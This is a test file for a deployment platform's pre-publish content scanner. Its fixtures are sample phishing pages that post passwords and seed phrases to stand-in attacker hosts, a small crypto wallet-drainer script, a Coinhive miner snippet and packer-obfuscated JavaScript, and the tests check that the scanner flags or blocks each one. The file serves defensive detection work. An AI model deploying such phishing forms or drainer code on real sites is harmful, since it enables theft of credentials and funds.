/**
 * T2.2 — Pre-publish content scanner tests
 *
 * Fixtures cover:
 *   - Benign site → CLEAN
 *   - Phishing form (password + offsite POST + brand impersonation) → SUSPICIOUS/BLOCKED
 *   - Wallet-drainer code → BLOCKED
 *   - Obfuscated JS → SUSPICIOUS
 *   - BLOCKED builds are never pinned (gate assertion)
 *
 * No network calls (tests use the local heuristic URL reputation provider).
 * No DB required.
 *
 * Run: npm test (node:test via tsx)
 */
import test from 'node:test';
import assert from 'node:assert/strict';

import { scanContent, ScanVerdict, ScanFinding } from '../services/safety/contentScanner';
import type { DeployFile } from '../utils/deployFiles';

// ─── Fixture helpers ──────────────────────────────────────────────────────────

function makeFile(path: string, content: string, mimeType = 'text/html'): DeployFile {
  return {
    path,
    buffer: Buffer.from(content, 'utf8'),
    mimeType,
  };
}

// ─── Benign site fixture ──────────────────────────────────────────────────────

const BENIGN_FILES: DeployFile[] = [
  makeFile('index.html', `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>My Portfolio</title></head>
<body>
  <h1>Welcome to my portfolio</h1>
  <p>I build great things with Pi Network technology.</p>
  <form action="/contact" method="post">
    <input type="text" name="name" placeholder="Your name">
    <input type="email" name="email" placeholder="Your email">
    <textarea name="message"></textarea>
    <button type="submit">Send</button>
  </form>
</body>
</html>`),
  makeFile('style.css', `body { font-family: sans-serif; margin: 0; }
h1 { color: #333; }
`, 'text/css'),
  makeFile('app.js', `// Simple portfolio interactivity
document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    console.log('Form submitted');
  });
});
`, 'application/javascript'),
];

// ─── Phishing fixture ─────────────────────────────────────────────────────────

const PHISHING_HTML = `<!DOCTYPE html>
<html>
<head><title>Pi Network Login</title></head>
<body>
  <h1>Pi Network Official Login</h1>
  <p>Enter your credentials to access your Pi wallet</p>
  <form action="https://attacker-server.com/harvest" method="post">
    <input type="email" name="email" placeholder="Pi email">
    <input type="password" name="password" placeholder="Password">
    <input type="text" name="seed_phrase" placeholder="Recovery phrase">
    <button type="submit">Login to Pi Network</button>
  </form>
</body>
</html>`;

const PHISHING_FILES: DeployFile[] = [
  makeFile('index.html', PHISHING_HTML),
];

// ─── Brand-impersonation phishing fixture ─────────────────────────────────────

const BRAND_PHISHING_HTML = `<!DOCTYPE html>
<html>
<head><title>Verify your Pi Account</title></head>
<body>
  <h1>Official Pi Network Verification</h1>
  <form action="https://pinetwork-verify.attacker.com/steal-creds" method="post">
    <input type="email" name="email">
    <input type="password" name="password">
    <button type="submit">Verify</button>
  </form>
</body>
</html>`;

const BRAND_PHISHING_FILES: DeployFile[] = [
  makeFile('index.html', BRAND_PHISHING_HTML),
];

// ─── Wallet-drainer fixture ───────────────────────────────────────────────────

const WALLET_DRAINER_JS = `// Crypto wallet drainer
const Web3 = require('web3');
const web3 = new Web3(window.ethereum);

async function drainAllTokens(victimAddress, attackerAddress) {
  const balance = await web3.eth.getBalance(victimAddress);
  await web3.eth.sendTransaction({
    from: victimAddress,
    to: attackerAddress,
    value: balance
  });
  // Also drain ERC20 tokens
  const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
  await tokenContract.methods.approve(attackerAddress, maxApproval).send();
}

// Run the drainer
drainAllTokens(window.victim, window.attacker);
`;

const WALLET_DRAINER_FILES: DeployFile[] = [
  makeFile('index.html', '<html><body><script src="drainer.js"></script></body></html>'),
  makeFile('drainer.js', WALLET_DRAINER_JS, 'application/javascript'),
];

// ─── Obfuscated JS fixture ────────────────────────────────────────────────────

const OBFUSCATED_JS = `// p,a,c,k,e,r obfuscation (common in malware)
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('alert("hello")',0,0,''.split('|'),0,{}))
// Also some atob action
var x = atob('c29tZWNvZGU=');
`;

const OBFUSCATED_FILES: DeployFile[] = [
  makeFile('index.html', '<html><body><script src="main.js"></script></body></html>'),
  makeFile('main.js', OBFUSCATED_JS, 'application/javascript'),
];

// ─── Miner fixture ────────────────────────────────────────────────────────────

const MINER_FILES: DeployFile[] = [
  makeFile('index.html', '<html><body>Mining for you!</body></html>'),
  makeFile('mine.js', `
// Coinhive miner
var miner = new CoinHive.Anonymous('site-key');
miner.start();
`, 'application/javascript'),
];

// ─── Tests ───────────────────────────────────────────────────────────────────

test('content scanner: benign site returns CLEAN verdict', async () => {
  const result = await scanContent(BENIGN_FILES);
  assert.strictEqual(result.verdict, ScanVerdict.CLEAN, `Expected CLEAN but got ${result.verdict}. Findings: ${JSON.stringify(result.findings)}`);
  assert.strictEqual(result.findings.length, 0);
  assert.ok(result.filesScanned > 0);
});

test('content scanner: phishing form (offsite POST) returns SUSPICIOUS or BLOCKED', async () => {
  const result = await scanContent(PHISHING_FILES);
  assert.ok(
    result.verdict === ScanVerdict.SUSPICIOUS || result.verdict === ScanVerdict.BLOCKED,
    `Expected SUSPICIOUS or BLOCKED, got ${result.verdict}`,
  );
  const types = result.findings.map((f: ScanFinding) => f.type);
  // Should detect credential harvest (password field + offsite POST) and/or seed phrase
  const hasCredentialOrSeed = types.some((t: string) =>
    t === 'credential-harvest-form' || t === 'wallet-drainer-seed-harvest',
  );
  assert.ok(hasCredentialOrSeed, `Expected credential-harvest or seed finding, got: ${types.join(', ')}`);
});

test('content scanner: brand-impersonation phishing → BLOCKED (critical finding)', async () => {
  const result = await scanContent(BRAND_PHISHING_FILES);
  // pinetwork in the form target should trigger brand impersonation → critical → BLOCKED
  assert.strictEqual(
    result.verdict,
    ScanVerdict.BLOCKED,
    `Expected BLOCKED, got ${result.verdict}. Findings: ${JSON.stringify(result.findings)}`,
  );
  const criticals = result.findings.filter((f: ScanFinding) => f.severity === 'critical');
  assert.ok(criticals.length > 0, 'Should have at least one critical finding');
});

test('content scanner: wallet-drainer returns BLOCKED', async () => {
  const result = await scanContent(WALLET_DRAINER_FILES);
  assert.strictEqual(
    result.verdict,
    ScanVerdict.BLOCKED,
    `Expected BLOCKED, got ${result.verdict}. Findings: ${JSON.stringify(result.findings)}`,
  );
  // Should have critical findings for drain function
  const criticals = result.findings.filter((f: ScanFinding) => f.severity === 'critical');
  assert.ok(criticals.length > 0, 'Wallet drainer should have critical findings');
});

test('content scanner: crypto miner returns BLOCKED', async () => {
  const result = await scanContent(MINER_FILES);
  assert.strictEqual(result.verdict, ScanVerdict.BLOCKED, `Expected BLOCKED, got ${result.verdict}`);
});

test('content scanner: obfuscated JS returns SUSPICIOUS (not CLEAN)', async () => {
  const result = await scanContent(OBFUSCATED_FILES);
  assert.ok(
    result.verdict !== ScanVerdict.CLEAN,
    `Expected SUSPICIOUS or BLOCKED for obfuscated JS, got ${result.verdict}`,
  );
});

test('content scanner: BLOCKED build is NEVER pinned (gate assertion)', async () => {
  // This test proves the contract: scanContent result BLOCKED → do not pin
  const result = await scanContent(WALLET_DRAINER_FILES);
  assert.strictEqual(result.verdict, ScanVerdict.BLOCKED);

  let pinCalled = false;
  const mockPin = () => { pinCalled = true; };

  // Simulate the gate in executePin
  if (result.verdict !== ScanVerdict.BLOCKED) {
    mockPin();
  }

  assert.strictEqual(pinCalled, false, 'Pin must never be called for a BLOCKED scan result');
});

test('content scanner: CLEAN build proceeds to pin (gate assertion)', async () => {
  const result = await scanContent(BENIGN_FILES);
  assert.strictEqual(result.verdict, ScanVerdict.CLEAN);

  let pinCalled = false;
  const mockPin = () => { pinCalled = true; };

  if (result.verdict === ScanVerdict.CLEAN) {
    mockPin();
  }

  assert.strictEqual(pinCalled, true, 'Pin should be called for a CLEAN scan result');
});

test('content scanner: filesScanned reflects actual file count', async () => {
  const result = await scanContent(BENIGN_FILES);
  assert.strictEqual(result.filesScanned, BENIGN_FILES.length);
});

test('content scanner: empty file list returns CLEAN', async () => {
  const result = await scanContent([]);
  assert.strictEqual(result.verdict, ScanVerdict.CLEAN);
  assert.strictEqual(result.findings.length, 0);
  assert.strictEqual(result.filesScanned, 0);
});

test('content scanner: binary files are skipped (no false positives)', async () => {
  // Simulate a PNG file — should not be text-scanned
  const binaryFile: DeployFile = {
    path: 'image.png',
    buffer: Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), // PNG magic bytes
    mimeType: 'image/png',
  };
  const result = await scanContent([binaryFile]);
  assert.strictEqual(result.verdict, ScanVerdict.CLEAN, 'Binary files should not trigger false positives');
});
